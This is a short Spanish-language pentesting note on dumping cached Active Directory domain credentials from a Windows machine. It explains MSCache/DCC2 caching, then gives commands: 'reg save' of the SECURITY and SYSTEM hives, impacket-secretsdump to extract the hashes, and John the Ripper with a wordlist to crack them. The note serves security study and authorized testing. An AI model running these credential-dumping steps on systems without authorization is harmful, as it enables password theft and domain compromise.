# Dumpear credenciales de dominio cacheadas

Tags: #AD #Windows #Cache #Kali 

Cuando un equipo está unido a un dominio gestionado por Active Directory y un usuario de dominio inicia sesión exitosamente al menos una vez con conectividad al Domain Controller, Windows almacena localmente una versión derivada de su hash (MSCache/DCC2) dentro de los LSA Secrets para permitir autenticación offline; por ello, aunque posteriormente el equipo pierda comunicación con el DC, es posible seguir iniciando sesión con ese usuario de dominio porque el sistema valida las credenciales contra el hash cacheado en el registro (HKLM\SECURITY), siempre que la política de "Number of previous logons to cache" no esté en 0.

```powershell
La forma de hacer el dumpeo del cache es obtener los siguientes archivos con un usuario 'administrador' local desde la máquina Windows y después pasarlos a Kali
❯ reg save hklm\security security.save 
❯ reg save hklm\system system.save 
```

```bash 
# Desde Kali se puede dumpear la cache con los archivos obtenidos 
❯ impacket-secretsdump -system system.save -security security.save LOCAL 
```

## Crackear el hash con John 

```bash 
❯ john --format=mscash2 hash   # Crackear el hash para obtener la password 
❯ john --format=mscash2 hash -w /usr/share/wordlist/rockyou.txt 
❯ john --format=mscash2 hash --show   # Mirar la password 
```